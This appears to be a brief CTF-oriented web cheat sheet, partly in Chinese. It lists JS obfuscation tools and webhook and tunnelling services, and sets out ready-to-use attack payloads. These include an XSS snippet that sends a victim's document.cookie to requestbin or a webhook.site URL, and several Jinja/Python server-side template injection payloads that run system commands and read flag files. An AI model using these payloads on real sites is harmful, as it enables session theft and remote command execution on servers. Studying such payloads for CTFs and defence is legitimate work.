---
title: Web Cheat Sheet
tags: [Tools, CTF, Web]

---

# Web Cheat Sheet
## Online Tools
| Fuck                             | Beautifier                       |
| -------------------------------- | -------------------------------- |
| [jsfuck](http://www.jsfuck.com/) | [JSNice](http://www.jsnice.org/) |
|[jjencode](https://utf-8.jp/public/jjencode.html)|[JS 反混淆器](https://beautifier.io/): 可以反混淆或解密JS的檔案|
|[aaencode](https://utf-8.jp/public/aaencode.html)|[JS 壓縮+加密+混淆+美化](https://js.wfuapp.com/)|
|[Esolang List](https://esolangs.org/wiki/Language_list)|[JS Fuck Decode](https://www.53lu.com/tool/jsfuckdecode/)|
||[aadecode](https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html)|

## Cheat-Sheet
* [XSS-CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
    利用XSS把session打到webhook上: 
    ```javascript?
    window.location=<requestbin.com>/?a+document.cookie
    // or
    fetch("https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194", { method: 'GET', headers: { 'Cookie': document.cookie } })
    ```
* [All-Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%19Injection/README.md)
* SSTI Payload: 記得找==os.\_wrap_close==
    ```
    {{().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id')}}
    {{self.__init__.__globals__.__builtins__.__import__("os").popen("cat%20Flag.txt").read()}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", "./flag.txt")}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']("cat /flag.txt")}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", file.lower())}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower())}}
    ```

## Others
* wasm $\to$ c: [wabt](https://github.com/WebAssembly/wabt)
    ```bash!
    # 按照說明build完後進到./build
    $ ./wasm2c {wasm file path} -o {output c file path}
    ```
* Webhook
    [Webhook.site](https://webhook.site/)
    [Beeceptor](https://beeceptor.com/)
    [Ngrok](https://ngrok.com/)